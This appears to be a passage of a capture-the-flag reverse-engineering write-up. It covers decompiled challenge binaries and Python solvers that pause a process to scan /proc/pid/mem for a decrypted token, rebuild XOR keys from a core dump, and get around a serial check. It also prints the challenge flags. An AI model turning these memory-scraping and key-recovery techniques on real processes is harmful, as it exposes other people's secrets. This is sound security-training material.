  uint32_t *puVar5;
  uint uVar6;
  uint32_t uVar7;
  uint32_t *puVar8;
  uint *puVar9;
  uint32_t *puVar10;
  uint uVar11;
  uint32_t uVar12;
  uint32_t uVar13;
  byte *pbVar14;
  byte *pbVar15;
  uint32_t uVar16;
  uint uVar17;
  uint uVar18;
  uint32_t uVar19;
  ulong uVar20;
  uint uVar21;
  uint uVar22;
  uint32_t uVar23;
  uint uVar24;
  uint32_t uVar25;
  uint uVar26;
  uint32_t uVar27;
  uint uVar28;
  uint uVar29;
  uint32_t uVar30;
  uint uVar31;
  uint uVar32;
  uint uVar33;
  uint32_t uVar34;
  uint uVar35;
  uint32_t uVar36;
  uint uVar37;
  uint32_t uVar38;
  uint uVar39;
  uint32_t uVar40;
  uint32_t uVar41;
  uint32_t uVar42;
  long in_FS_OFFSET;
  uint32_t *local_1a8;
  uint32_t local_18c;
  ulong local_178;
  int local_170;
  uint local_16c;
  uint local_168;
  uchar sink;
  pthread_t th;
  timespec ts;
  uint32_t st [16];
  uint32_t w [16];
  uint32_t local_b8;
  uint8_t nonce [12];
  uint8_t key [32];
  uint8_t block [64];
  byte local_48 [8];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  sVar4 = sysconf(0x1e);
  __len = 0x1000;
  if (0 < (long)sVar4) {
    __len = sVar4;
  }
  g_pagesz = __len;
  __addr = mmap((void *)0x0,__len,3,0x22,-1,0);
  g_page = __addr;
  if (__addr == (void *)0xffffffffffffffff) {
    perror("mmap");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  g_len = 0x6f;
  puVar8 = K32;
  uVar40 = 0xf3a4985c;
  g_slot = (uchar *)((long)__addr + 0x80);
  pbVar15 = key;
  while( true ) {
    puVar8 = puVar8 + 1;
    *pbVar15 = (byte)uVar40;
    pbVar15[1] = (byte)(uVar40 >> 8);
    pbVar15[2] = (byte)(uVar40 >> 0x10);
    pbVar15[3] = (byte)(uVar40 >> 0x18);
    if (block == pbVar15 + 4) break;
    uVar40 = *puVar8;
    pbVar15 = pbVar15 + 4;
  }
  uVar40 = 0x642d636e;
  puVar8 = N32;
  pbVar15 = nonce;
  while( true ) {
    *pbVar15 = (byte)uVar40;
    puVar8 = puVar8 + 1;
    pbVar15[1] = (byte)(uVar40 >> 8);
    pbVar15[2] = (byte)(uVar40 >> 0x10);
    pbVar15[3] = (byte)(uVar40 >> 0x18);
    if (key == pbVar15 + 4) break;
    uVar40 = *puVar8;
    pbVar15 = pbVar15 + 4;
  }
  local_178 = 0;
  local_18c = 0;
  *(undefined8 *)((long)__addr + 0x80) = 0xefb14c149b3b4c26;
  *(undefined8 *)((long)__addr + 0x88) = 0xe0edbcb7cb626545;
  *(undefined8 *)((long)__addr + 0xe0) = 0x3aa52facabd39adc;
  *(undefined2 *)((long)__addr + 0xec) = 0xfd28;
  *(undefined8 *)((long)__addr + 0x90) = 0x911828a0c531f0fa;
  *(undefined8 *)((long)__addr + 0x98) = 0xe943cbeb55318fef;
  *(undefined8 *)((long)__addr + 0xa0) = 0x56b7e88bf70ca1e1;
  *(undefined8 *)((long)__addr + 0xa8) = 0x4b4c5d59225dcdc3;
  *(undefined8 *)((long)__addr + 0xb0) = 0x924a239c4cf45e3d;
  *(undefined8 *)((long)__addr + 0xb8) = 0x475fb0e3eb6dc589;
  *(undefined8 *)((long)__addr + 0xc0) = 0xe72f86321c753556;
  *(undefined8 *)((long)__addr + 200) = 0xe3658eca2d7018e3;
  *(undefined4 *)((long)__addr + 0xe8) = 0xade78656;
  *(undefined1 *)((long)__addr + 0xee) = 10;
  *(undefined8 *)((long)__addr + 0xd0) = 0x706bebda72e20067;
  *(undefined8 *)((long)__addr + 0xd8) = 0xae4e6ee42ac766c5;
  do {
    st[1] = 0x3320646e;
    st[2] = 0x79622d32;
    st[3] = 0x6b206574;
    puVar9 = st + 4;
    pbVar15 = key;
    do {
      pbVar14 = pbVar15 + 4;
      *puVar9 = (uint)pbVar15[1] << 8 | (uint)pbVar15[2] << 0x10 | (uint)*pbVar15 |
                (uint)pbVar15[3] << 0x18;
      puVar9 = puVar9 + 1;
      pbVar15 = pbVar14;
    } while (block != pbVar14);
    st[0xc] = local_18c;
    uVar40 = 0x61707865;
    st[0xd]._0_1_ = nonce[0];
    st[0xd]._1_1_ = nonce[1];
    st[0xd]._2_1_ = nonce[2];
    st[0xd]._3_1_ = nonce[3];
    st._56_8_ = nonce._4_8_;
    puVar8 = st + 1;
    puVar10 = w;
    while( true ) {
      *puVar10 = uVar40;
      puVar10 = puVar10 + 1;
      if (w == puVar8) break;
      uVar40 = *puVar8;
      puVar8 = puVar8 + 1;
    }
    local_170 = 10;
    local_16c = w[6];
    local_168 = w[7];
    uVar40 = w[0];
    uVar30 = w[4];
    uVar7 = w[0xc];
    uVar23 = w[8];
    uVar27 = w[1];
    uVar34 = w[5];
    uVar12 = w[0xd];
    uVar19 = w[9];
    uVar25 = w[2];
    uVar2 = w[0xe];
    uVar38 = w[10];
    uVar16 = w[3];
    uVar42 = w[0xf];
    uVar36 = w[0xb];
    do {
      uVar11 = uVar12 ^ uVar27 + uVar34;
      uVar6 = uVar7 ^ uVar40 + uVar30;
      uVar11 = uVar11 << 0x10 | uVar11 >> 0x10;
      uVar6 = uVar6 << 0x10 | uVar6 >> 0x10;
      uVar17 = uVar19 + uVar11;
      uVar21 = uVar23 + uVar6;
      uVar31 = uVar34 ^ uVar17;
      uVar28 = uVar30 ^ uVar21;
      uVar32 = uVar31 << 0xc | uVar31 >> 0x14;
      uVar31 = uVar28 << 0xc | uVar28 >> 0x14;
      uVar26 = uVar27 + uVar34 + uVar32;
      uVar39 = uVar40 + uVar30 + uVar31;
      uVar11 = uVar11 ^ uVar26;
      uVar6 = uVar6 ^ uVar39;
      uVar28 = uVar11 << 8 | uVar11 >> 0x18;
      uVar11 = uVar6 << 8 | uVar6 >> 0x18;
      uVar17 = uVar17 + uVar28;
      uVar21 = uVar21 + uVar11;
      uVar32 = uVar32 ^ uVar17;
      uVar31 = uVar31 ^ uVar21;
      uVar29 = uVar31 << 7 | uVar31 >> 0x19;
      uVar33 = uVar32 << 7 | uVar32 >> 0x19;
      uVar6 = uVar2 ^ uVar25 + local_16c;
      uVar6 = uVar6 << 0x10 | uVar6 >> 0x10;
      uVar37 = uVar38 + uVar6;
      uVar31 = local_16c ^ uVar37;
      uVar32 = uVar31 << 0xc | uVar31 >> 0x14;
      uVar24 = uVar25 + local_16c + uVar32;
      uVar6 = uVar6 ^ uVar24;
      uVar6 = uVar6 << 8 | uVar6 >> 0x18;
      uVar31 = uVar42 ^ local_168 + uVar16;
      uVar39 = uVar39 + uVar33;
      uVar37 = uVar37 + uVar6;
      uVar31 = uVar31 << 0x10 | uVar31 >> 0x10;
      uVar32 = uVar32 ^ uVar37;
      uVar35 = uVar36 + uVar31;
      uVar22 = uVar32 << 7 | uVar32 >> 0x19;
      uVar32 = local_168 ^ uVar35;
      uVar26 = uVar26 + uVar22;
      uVar18 = uVar32 << 0xc | uVar32 >> 0x14;
      uVar11 = uVar11 ^ uVar26;
      uVar32 = local_168 + uVar16 + uVar18;
      uVar11 = uVar11 << 0x10 | uVar11 >> 0x10;
      uVar31 = uVar31 ^ uVar32;
      uVar31 = uVar31 << 8 | uVar31 >> 0x18;
      uVar35 = uVar35 + uVar31;
      uVar31 = uVar31 ^ uVar39;
      uVar31 = uVar31 << 0x10 | uVar31 >> 0x10;
      uVar18 = uVar18 ^ uVar35;
      uVar35 = uVar35 + uVar11;
      uVar37 = uVar37 + uVar31;
      uVar22 = uVar22 ^ uVar35;
      uVar18 = uVar18 << 7 | uVar18 >> 0x19;
      uVar33 = uVar33 ^ uVar37;
      uVar33 = uVar33 << 0xc | uVar33 >> 0x14;
      uVar40 = uVar39 + uVar33;
      uVar31 = uVar31 ^ uVar40;
      uVar42 = uVar31 << 8 | uVar31 >> 0x18;
      uVar38 = uVar37 + uVar42;
      uVar33 = uVar33 ^ uVar38;
      uVar34 = uVar33 << 7 | uVar33 >> 0x19;
      uVar31 = uVar22 << 0xc | uVar22 >> 0x14;
      uVar24 = uVar24 + uVar18;
      uVar27 = uVar26 + uVar31;
      uVar28 = uVar28 ^ uVar24;
      uVar11 = uVar11 ^ uVar27;
      uVar28 = uVar28 << 0x10 | uVar28 >> 0x10;
      uVar7 = uVar11 << 8 | uVar11 >> 0x18;
      uVar36 = uVar35 + uVar7;
      uVar31 = uVar31 ^ uVar36;
      local_16c = uVar31 << 7 | uVar31 >> 0x19;
      uVar21 = uVar21 + uVar28;
      uVar18 = uVar18 ^ uVar21;
      uVar11 = uVar18 << 0xc | uVar18 >> 0x14;
      uVar25 = uVar24 + uVar11;
      uVar28 = uVar28 ^ uVar25;
      uVar12 = uVar28 << 8 | uVar28 >> 0x18;
      uVar23 = uVar21 + uVar12;
      uVar11 = uVar11 ^ uVar23;
      local_168 = uVar11 << 7 | uVar11 >> 0x19;
      uVar32 = uVar29 + uVar32;
      uVar6 = uVar6 ^ uVar32;
      uVar6 = uVar6 << 0x10 | uVar6 >> 0x10;
      uVar17 = uVar17 + uVar6;
      uVar29 = uVar29 ^ uVar17;
      uVar11 = uVar29 << 0xc | uVar29 >> 0x14;
      uVar16 = uVar32 + uVar11;
      uVar6 = uVar6 ^ uVar16;
      uVar2 = uVar6 << 8 | uVar6 >> 0x18;
      uVar19 = uVar17 + uVar2;
      uVar11 = uVar11 ^ uVar19;
      uVar30 = uVar11 << 7 | uVar11 >> 0x19;
      local_170 = local_170 + -1;
    } while (local_170 != 0);
    uVar13 = 0x61707865;
    puVar8 = w;
    puVar10 = st + 1;
    uVar41 = uVar40;
    while( true ) {
      puVar5 = puVar8 + 1;
      *puVar8 = uVar41 + uVar13;
      pbVar15 = block;
      local_1a8 = w;
      if (&local_b8 == puVar5) break;
      uVar41 = *puVar5;
      uVar13 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar8 = puVar5;
    }
    do {
      pbVar14 = pbVar15 + 4;
      uVar41 = *local_1a8;
      *pbVar15 = (byte)uVar41;
      pbVar15[1] = (byte)(uVar41 >> 8);
      pbVar15[2] = (byte)(uVar41 >> 0x10);
      pbVar15[3] = (byte)(uVar41 >> 0x18);
      pbVar15 = pbVar14;
      local_1a8 = local_1a8 + 1;
    } while (local_48 != pbVar14);
    uVar20 = 0x6f - local_178;
    if (0x40 < uVar20) {
      uVar20 = 0x40;
    }
    pbVar15 = (byte *)((long)__addr + local_178 + 0x80);
    pbVar14 = block;
    do {
      bVar1 = *pbVar14;
      pbVar14 = pbVar14 + 1;
      *pbVar15 = *pbVar15 ^ bVar1;
      pbVar15 = pbVar15 + 1;
    } while (block + uVar20 != pbVar14);
    local_178 = local_178 + uVar20;
    local_18c = local_18c + 1;
    w[0] = uVar40;
    w[1] = uVar27;
    w[2] = uVar25;
    w[3] = uVar16;
    w[4] = uVar30;
    w[5] = uVar34;
    w[6] = local_16c;
    w[7] = local_168;
    w[8] = uVar23;
    w[9] = uVar19;
    w[10] = uVar38;
    w[0xb] = uVar36;
    w[0xc] = uVar7;
    w[0xd] = uVar12;
    w[0xe] = uVar2;
    w[0xf] = uVar42;
  } while (local_178 < 0x6f);
  iVar3 = mprotect(__addr,__len,1);
  if (iVar3 != 0) {
    perror("mprotect");
  }
  iVar3 = pthread_create(&th,(pthread_attr_t *)0x0,eraser,(void *)0x0);
  if (iVar3 != 0) {
    perror("pthread_create");
  }
  else {
    write(1,"[audit] handshake: ready\n",0x19);
    ts.tv_sec = 2;
    ts.tv_nsec = 0;
    nanosleep((timespec *)&ts,(timespec *)0x0);
    pthread_join(th,(void **)0x0);
  }
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (uint)(iVar3 != 0);
}
```

`main` flow :
1. Determine page size (`sysconf`), then `mmap` RW anon page and save it on the global `g_page`. Pointer slot payload determined to `g_slot = g_page + 0x80`, length `g_len = 0x6f` (111 byte).
2. Fill `key[32]` from array 32‑bit `K32` and `nonce[12]` from `N32`.
3. Write first data block (ciphertext) to `g_slot` towards a chain of `*(u64*)(g_page+offset) = ...`.
4. Resulting keystream ChaCha20 per 64‑byte into the `block[64]`, then XOR to the `g_slot` as amount of `g_len` byte. This is the token decryption phase.
5. Call `mprotect(g_page, g_pagesz, PROT_READ)`, changing page to the read-only.
6. Create thread `eraser`, then soonly print `"[audit] handshake: ready\n"` and sleep 2 seconds.

```c
void * eraser(void *arg)

{
  long lVar1;
  void *__addr;
  uchar *__s;
  char *pcVar2;
  long in_FS_OFFSET;
  timespec ts;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  ts.tv_sec = 0;
  ts.tv_nsec = 700000000;
  nanosleep((timespec *)&ts,(timespec *)0x0);
  __s = g_slot;
  __addr = g_page;
  if ((g_slot != (uchar *)0x0) && (g_page != (void *)0x0)) {
    pcVar2 = getenv("DIAG_SAFE_ERASE");
    if (pcVar2 != (char *)0x0) {
      mprotect(__addr,g_pagesz,3);
    }
    memset(__s,0,g_len);
    ts.tv_nsec = 120000000;
    nanosleep((timespec *)&ts,(timespec *)0x0);
    munmap(g_page,g_pagesz);
    g_page = (void *)0x0;
    g_slot = (uchar *)0x0;
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return (void *)0x0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

`eraser`flow :
* Sleep **700 ms**,
* If environment `DIAG_SAFE_ERASE` available, then do `mprotect(g_page, g_pagesz, PROT_READ|PROT_WRITE)` so it can write,
* `memset(g_slot, 0, g_len)`, zeroing token,
* Sleep **120 ms**, then `munmap(g_page, g_pagesz)`.

Token decrypted full to the RAM (anonymous `mmap`) and for \~700 ms **can be read** with debugger. The protection create RO page that prevent reading, only write. Because :

* No anti‑debug/anti‑dump (`prctl(PR_SET_DUMPABLE,0)`, seccomp, YAMA ptrace),
* Decryption happens in process address,
* Time gap between handshake print and `eraser` zeroing is wide enough.

Without depend on global symbol, we can use **syscall catch** to obtain page address.
The Solver ini runs `./diag`, wait `handshake` to appears in stdout, soonly **SIGSTOP**, scan `mem` for flag `NCLPS1{...}`, then **SIGCONT** so the process can continued normally.

```python
import os, re, sys, fcntl, signal, subprocess, time

PATTERN = re.compile(rb'NCLPS1\{[^}]+\}')
HANDSHAKE_HINT = b'handshake'

def nonblock(fd):
    import fcntl as F
    fl = F.fcntl(fd, F.F_GETFL)
    F.fcntl(fd, F.F_SETFL, fl | os.O_NONBLOCK)

def scan_mem(pid):
    hits = []
    with open(f'/proc/{pid}/maps') as mp, open(f'/proc/{pid}/mem','rb',0) as mem:
        for line in mp:
            rng, perms, *_ = line.split()
            if 'r' not in perms:
                continue
            start, end = (int(x,16) for x in rng.split('-'))
            try:
                mem.seek(start)
                data = mem.read(min(end-start, 8_000_000))
            except Exception:
                continue
            for m in PATTERN.finditer(data):
                hits.append((start + m.start(), m.group(0)))
    return hits

def main():
    p = subprocess.Popen(['./diag'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    nonblock(p.stdout.fileno())
    buf=b''; t0=time.time(); carved=False
    while p.poll() is None:
        try:
            chunk = os.read(p.stdout.fileno(), 65536)
            if chunk:
                buf += chunk
                if b'handshake' in buf and not carved:
                    os.kill(p.pid, signal.SIGSTOP)
                    for addr, tok in scan_mem(p.pid):
                        print(f'[+] token @0x{addr:x}: {tok.decode()}')
                    os.kill(p.pid, signal.SIGCONT)
                    carved=True
        except BlockingIOError:
            pass
        if not carved and time.time()-t0 > 1.5: # fallback
            os.kill(p.pid, signal.SIGSTOP)
            for addr, tok in scan_mem(p.pid):
                print(f'[+] token (fallback) @0x{addr:x}: {tok.decode()}')
            os.kill(p.pid, signal.SIGCONT)
            carved=True
        time.sleep(0.01)

if __name__ == '__main__':
    main()
```

#### Flag
NCLPS1{h4lo_s4aAt_1ni_p3rus4HaaN_seD4ng_m3LaKukan_4ud1t_moh0on_s3Lalu_m3ng1kutI_pr0tokol_p3rusahaan_91425d37c5}

### findmysereal

#### Description
ayo cari aku cari aku, blob blob blob

#### Solution

```c
  std::getline<>((istream *)&std::cin,(string *)&local_68,cVar4);
  piVar6 = __errno_location();
  *piVar6 = 0;
  lVar7 = ptrace(PTRACE_TRACEME,0,0,0);
  if (((int)lVar7 == -1) && (*piVar6 == 1)) {
    FUN_001015d0(std::cout,"Debugger detected - aborting.\n");
  }
```

* Timing Gate
```cpp
    lVar7 = std::chrono::_V2::system_clock::now();
    lVar8 = 0;
    do {
      lVar8 = lVar8 + 1;
    } while (lVar8 != 1200000);
    lVar8 = std::chrono::_V2::system_clock::now();
    if (lVar8 - lVar7 < 800000000) {
      if (local_68 == local_68 + local_60) {
LAB_00101309:
        FUN_001015d0(std::cout,"Invalid serial.\n");
      }
      else {
        uVar5 = 0x811c9dc5;
        pbVar10 = local_68;
        do {
          bVar1 = *pbVar10;
          pbVar10 = pbVar10 + 1;
          uVar3 = (uVar5 ^ bVar1) * 0x20003260;
          uVar5 = (uVar3 | (uVar5 ^ bVar1) * 0x1000193 >> 0x1b) ^ uVar3 >> 0xd;
        } while (pbVar10 != local_68 + local_60);
        if (uVar5 != 0x14530451) goto LAB_00101309;
        FUN_001015d0(std::cout,"Serial OK. Decrypting flag...\n");
        local_48 = local_38;
        local_38[0] = '\0';
        local_40 = 0;
                    /* try { // try from 001013c6 to 001013f6 has its CatchHandler @ 00101442 */
        std::string::reserve((ulong)&local_48);
        lVar8 = DAT_00104308;
        for (lVar7 = DAT_00104300; lVar7 != lVar8; lVar7 = lVar7 + 1) {
          std::string::push_back((char)&local_48);
        }
                    /* try { // try from 0010140d to 00101420 has its CatchHandler @ 0010144f */
        poVar9 = std::__ostream_insert<>((ostream *)std::cout,local_48,local_40);
        FUN_001015d0(poVar9,"\n");
        std::string::_M_dispose();
      }
      uVar11 = 0;
      goto LAB_0010131a;
    }
                    /* try { // try from 00101438 to 0010143c has its CatchHandler @ 0010144a */
    FUN_001015d0(std::cout,"Timing check failed - try again.\n");
```

Program asks one line of *serial*, running anti‑debug `ptrace(PTRACE_TRACEME)`, then do *timing gate* using `std::chrono::system_clock::now()` before and after *busy loop* iterated 1.200.000 times. If the duration exceeds ~0,8 detik, program will stop to be executed. After pass it, input hashed using schema that looks like FNV‑1a and compared with target constant.

* Custom Hash on Serial

```c
      else {
        uVar5 = 0x811c9dc5;
        pbVar10 = local_68;
        do {
          bVar1 = *pbVar10;
          pbVar10 = pbVar10 + 1;
          uVar3 = (uVar5 ^ bVar1) * 0x20003260;
          uVar5 = (uVar3 | (uVar5 ^ bVar1) * 0x1000193 >> 0x1b) ^ uVar3 >> 0xd;
        } while (pbVar10 != local_68 + local_60);
        if (uVar5 != 0x14530451) goto LAB_00101309;
        FUN_001015d0(std::cout,"Serial OK. Decrypting flag...\n");
        local_48 = local_38;
        local_38[0] = '\0';
        local_40 = 0;
                    /* try { // try from 001013c6 to 001013f6 has its CatchHandler @ 00101442 */
        std::string::reserve((ulong)&local_48);
        lVar8 = DAT_00104308;
        for (lVar7 = DAT_00104300; lVar7 != lVar8; lVar7 = lVar7 + 1) {
          std::string::push_back((char)&local_48);
        }
                    /* try { // try from 0010140d to 00101420 has its CatchHandler @ 0010144f */
        poVar9 = std::__ostream_insert<>((ostream *)std::cout,local_48,local_40);
        FUN_001015d0(poVar9,"\n");
        std::string::_M_dispose();
      }
```

initialization used **FNV‑1a basis offset** `0x811c9dc5`, then combined two multiplication and bit operation. If *hash* is valid, program will show message "Serial OK. Decrypting flag..." then create output string from the range of global data in the heap.

```c
void _INIT_1(void)

{
  DAT_00104310 = 0;
  _DAT_00104300 = (undefined1  [16])0x0;
                    /* try { // try from 0010147c to 00101480 has its CatchHandler @ 001014cb */
  DAT_00104300 = (undefined8 *)operator.new(0x17);
  DAT_00104310 = (long)DAT_00104300 + 0x17;
  *DAT_00104300 = 0xf7dcd63550d33293;
  DAT_00104300[1] = 0x5c92b1f4b7bcb193;
  *(undefined8 *)((long)DAT_00104300 + 0xf) = 0xf53cf7b1d693f45c;
  DAT_00104308 = (long)DAT_00104300 + 0x17;
  __cxa_atexit(FUN_00101630,&DAT_00104300,&PTR_LOOP_00104088);
  return;
}
```

At the *initializer*, program fills buffer cipher in the heap with 0x17 byte (23 byte) and do three 64-bit storage that overlapping so the result is sorted byte not ASCII (ciphertext).  Before *push_back*, loop will transformed per‑byte.

After projected to the *little‑endian*, 23 byte that formed is: 93 32 d3 50 35 d6 dc f7 93 b1 bc b7 f4 b1 92 5c f4 93 d6 b1 f7 3c f5. This bytes can't write as ASCII, so it's impossible to print directly from flag.

```asm
001013e0  MOVZX ESI, byte ptr [R14]   ; load src byte
001013e4  MOV   RDI, R12              ; this = &std::string
001013e7  XOR   ESI, 0x5a             ; src ^= 0x5A
001013ea  ROL   SIL, 0x3              ; src = rotl8(src, 3)
001013ee  MOVSX ESI, SIL              ; sign-extend 8→32
001013f2  CALL  std::string::push_back(char)
```

Disasembly in loop body shows per-byte transformation before added to `std::string`:.
It means, every output is calculated as **`ROL8((cipher[i] ^ 0x5A), 3)`**. With that, we can extract the flag with this solver:

```python
cipher = bytes.fromhex(
    "93 32 d3 50 35 d6 dc f7 93 b1 bc b7 f4 b1 92 5c f4 93 d6 b1 f7 3c f5".replace(" ", "")
)
rol8 = lambda v, r: ((v << r) & 0xff) | (v >> (8 - r))
flag = bytes(rol8(b ^ 0x5A, 3) for b in cipher).decode()
print(flag)
```

#### Flag
NCLP{d4mN_7ou_F0uNd_m3}

### Gamble Operation

#### Description
A secret agent has just completed a crucial mission, successfully infiltrating an enemy lair and obtaining vital intelligence data. To ensure the confidentiality of the data, he uses a special encryption program designed to be highly secure. The program claims to use a multi-layered encryption technique with a randomly generated key for each session, ensuring no two encryptions are the same.

However, in the middle of writing the encrypted data to disk, an unexpected incident occurred that caused the agent's system to crash. Fortunately, he was able to recover some artifacts from the crashed system.

Your task is that of a reverse engineering expert. Using the available artifacts, you must recover the original hidden intelligence data.

#### Solution
```c
void initialize_keys(int num_keys,int key_len)

{
  char **ppcVar1;
  char *pcVar2;
  ssize_t sVar3;
  int key_len_local;
  int num_keys_local;
  int i;
  int j;
  int j_1;
  
  g_key_store = (char **)malloc((long)num_keys << 3);
  if (g_key_store == (char **)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  i = 0;
  while( true ) {
    if (num_keys <= i) {
      return;
    }
    ppcVar1 = g_key_store + i;
    pcVar2 = (char *)malloc((long)key_len);
    *ppcVar1 = pcVar2;
    if (g_key_store[i] == (char *)0x0) break;
    sVar3 = read(g_random_fd,g_key_store[i],(long)key_len);
    if (sVar3 != key_len) {
      for (j_1 = 0; j_1 <= i; j_1 = j_1 + 1) {
        free(g_key_store[j_1]);
      }
      free(g_key_store);
      g_key_store = (char **)0x0;
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    i = i + 1;
  }
  for (j = 0; j < i; j = j + 1) {
    free(g_key_store[j]);
  }
  free(g_key_store);
  g_key_store = (char **)0x0;
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Decompiled shows `initialize_keys(num_keys, key_len)` function that allocate key pointer array in the heap, then fill it with every key from `/dev/urandom`. From the constant in the call‑site, we can see `num_keys = 0x32` (50) and `key_len = 0x80` (128). 

```c
void encrypt_data(uchar *data,int data_len,int num_keys,int key_len)

{
  int key_len_local;
  int num_keys_local;
  int data_len_local;
  uchar *data_local;
  int k;
  int i;
  
  if (g_key_store != (char **)0x0) {
    for (k = 0; k < num_keys; k = k + 1) {
      for (i = 0; i < data_len; i = i + 1) {
        data[i] = data[i] ^ g_key_store[k][i % key_len];
      }
    }
    puts("[-] Data encrypted.");
  }
  return;
}
```

`encrypt_data(buf, len, num_layers, key_len)` XOR for each layer of `i`, every byte `buf[j]` XOR with `key[i][j % key_len]`. With that, every layer of this will be equivalent with XOR plaintext with **one combined keystream** throughout 128 byte, that XOR each position by 50 key. 

```c
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void create_memory_dump(void)

{
  long lVar1;
  uint uVar2;
  int iVar3;
  long in_FS_OFFSET;
  pid_t pid;
  char cmd [256];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  uVar2 = getpid();
  snprintf(cmd,0x100,"gcore -o temp_dump %d > /dev/null 2>&1 && mv temp_dump.%d coredmp",
           (ulong)uVar2,(ulong)uVar2);
  iVar3 = system(cmd);
  if (iVar3 == -1) {
    perror("[-] Failed to run gcore.");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

After ciphertext written, program calls core dump creator (`create_memory_dump` -> `gcore`) before the process is actually off.

The main vuln is in the **key leakage through core dump**. Every layer is just an XOR with key chunk 128‑byte that differents, every layer collapses become one combined keystream with length 128 byte: `KS[j] = key0[j] ^ key1[j] ^ … ^ key49[j]` for `j ∈ [0..127]`. Core dump reveals every heap content that save 50 raw key, we can calculate XOR per position to create combined keystream. Decryption can do with `PT[i] = CT[i] ^ KS[i % 128]`. Program intendedly create core so every secret material still left behind.

The solver parsing ELF core, read program headers (PT\_LOAD/PT\_NOTE), extract `AT_ENTRY` from `NT_AUXV`, calculate BASE, read pointer `g_key_store` (offset global 0x4030), search 50 key pointer, XOR per position (128B), then decrypt `encrypted_flag.idn`.

```python
import struct

CORE = "coredmp"
enc  = "encrypted_flag.idn"

with open(CORE, "rb") as f:
    core = f.read()
assert core[:4] == b"\x7fELF" and core[4] == 2
endi = "<"  # little endian

# ELF header
(e_type, e_machine, e_version, e_entry, e_phoff, e_shoff,
 e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx) = struct.unpack(
    endi+"HHIQQQIHHHHHH", core[16:64])

phdrs = []
for i in range(e_phnum):
    off = e_phoff + i*e_phentsize
    p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack(
        endi+"IIQQQQQQ", core[off:off+56])
    phdrs.append(dict(type=p_type, flags=p_flags, offset=p_offset, vaddr=p_vaddr, filesz=p_filesz, memsz=p_memsz))

def read_va(va, size):
    for ph in phdrs:
        if ph["type"] == 1:  # PT_LOAD
            start, end = ph["vaddr"], ph["vaddr"] + ph["memsz"]
            if start <= va < end:
                file_off = ph["offset"] + (va - start)
                return core[file_off:file_off+size]
    raise RuntimeError("VA di luar segmen PT_LOAD")

# parse NT_AUXV for BASE (AT_ENTRY - entrypoint_offset)
AT_ENTRY=None
for ph in phdrs:
    if ph["type"] != 4:  # PT_NOTE
        continue
    data = core[ph["offset"]:ph["offset"]+ph["filesz"]]
    off=0
    while off+12 <= len(data):
        namesz, descsz, ntype = struct.unpack(endi+"III", data[off:off+12])
        off += 12
        off += (namesz + 3) & ~3
        desc = data[off:off+descsz]
        off += (descsz + 3) & ~3
        if ntype == 6:  # NT_AUXV
            for i in range(0, len(desc), 16):
                a_type, a_val = struct.unpack(endi+"QQ", desc[i:i+16])
                if a_type == 9:  # AT_ENTRY
                    AT_ENTRY = a_val
                    break

if AT_ENTRY is None:
    raise RuntimeError("AT_ENTRY not found in NT_AUXV")

ENTRY_OFFSET = 0x1200
BASE = AT_ENTRY - ENTRY_OFFSET

# take pointer array g_key_store
G_KEY_STORE_OFF = 0x4030
ptr_tbl = read_va(BASE + G_KEY_STORE_OFF, 8)
g_key_store, = struct.unpack(endi+"Q", ptr_tbl)

ptrs = []
for i in range(0, 8*60, 8):
    p_bytes = read_va(g_key_store + i, 8)
    p, = struct.unpack(endi+"Q", p_bytes)
    if p == 0:
        break
    ptrs.append(p)

NUM_KEYS = 50
KEYLEN   = 128
assert len(ptrs) >= NUM_KEYS, f"Only {len(ptrs)} pointer, expected {NUM_KEYS}"
ptrs = ptrs[:NUM_KEYS]

keystream = bytearray(KEYLEN)
for p in ptrs:
    key = read_va(p, KEYLEN)
    for i, b in enumerate(key):
        keystream[i] ^= b

with open(enc, "rb") as f:
    ct = f.read()
pt = bytes(c ^ keystream[i % KEYLEN] for i, c in enumerate(ct))

try:
    print(pt.decode("utf-8"))
except UnicodeDecodeError:
    with open("decrypted.bin", "wb") as f:
        f.write(pt)
    print("[+] Plaintext saved in decrypted.bin")
```

#### Flag

NCLPS1{ay00_m3nujJu_t4akk_t3rbba4t4s_d4an_Mel4mp4uwii_e64b364595}

### License

#### Description
A local software company has just released their digital product. This product can only be used after activation using an encrypted license file that will be generated if you can enter a valid “authorization code”. Their internal security team is quite confident that this protection system is safe enough from piracy because there is no flag directly in the binary

#### Solution
```c
undefined8 main(void)

{
  int iVar1;
  undefined8 uVar2;
  size_t sVar3;
  long lVar4;
  void *__ptr;
  FILE *__s;
  long in_FS_OFFSET;
  int local_e4;
  char local_b8 [32];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter your 8-digit serial key: ");
  iVar1 = __isoc99_scanf(&DAT_00102038,local_b8);
  if (iVar1 == 1) {
    sVar3 = strlen(local_b8);
    if (sVar3 == 8) {
      for (local_e4 = 0; local_e4 < 8; local_e4 = local_e4 + 1) {
        if ((local_b8[local_e4] < '0') || ('9' < local_b8[local_e4])) {
          puts("Serial key hanya boleh angka.");
          uVar2 = 1;
          goto LAB_001017f2;
        }
      }
      lVar4 = custom_hash(local_b8);
      printf("custom_hash(\"%s\") = 0x%016llxULL\n",local_b8,lVar4);
      if (lVar4 == 0x5ad4f40b2b0a4f09) {
        iVar1 = read_flag(local_98,0x80);
        if (iVar1 == 0) {
          puts("Gagal membaca flag dari .env.");
          uVar2 = 1;
        }
        else {
          sVar3 = strlen(local_98);
          __ptr = malloc(sVar3);
